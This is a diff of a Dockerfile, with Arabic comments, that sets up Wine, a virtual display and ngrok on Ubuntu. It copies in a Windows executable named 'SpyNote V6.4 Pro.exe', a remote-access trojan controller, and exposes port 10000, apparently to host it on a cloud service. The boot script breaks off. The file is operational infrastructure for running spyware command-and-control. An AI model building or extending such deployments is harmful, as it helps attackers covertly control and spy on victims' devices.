@@ -2,7 +2,6 @@ FROM ubuntu:22.04
 
 ENV DEBIAN_FRONTEND=noninteractive
 
-# تثبيت Wine والبيئة الرسومية
 RUN dpkg --add-architecture i386 && \
     apt-get update && apt-get install -y \
     xvfb \
@@ -16,19 +15,17 @@ RUN dpkg --add-architecture i386 && \
     gnupg \
     && rm -rf /var/lib/apt/lists/*
 
-# تثبيت Ngrok (اختياري، لكننا نستخدم منفذ Render مباشرة)
 RUN curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | gpg --dearmor -o /etc/apt/keyrings/ngrok.gpg && \
     echo "deb [signed-by=/etc/apt/keyrings/ngrok.gpg] https://ngrok-agent.s3.amazonaws.com buster main" | tee /etc/apt/sources.list.d/ngrok.list && \
     apt-get update && apt-get install -y ngrok
 
 WORKDIR /app
 
-# انسخ ملف SpyNote.exe (غيّر الاسم حسب ملفك)
-COPY SpyNote\ V6.4\ Pro.exe /app/app.exe
+# استخدم الاسم الجديد للملف (بدون مسافات)
+COPY SpyNote.exe /app/app.exe
 
 EXPOSE 10000
 
-# سكربت الإقلاع
 RUN echo '#!/bin/bash\n\
 Xvfb :1 -screen 0 1024x768x16 &\n\
 export DISPLAY=:1\n\
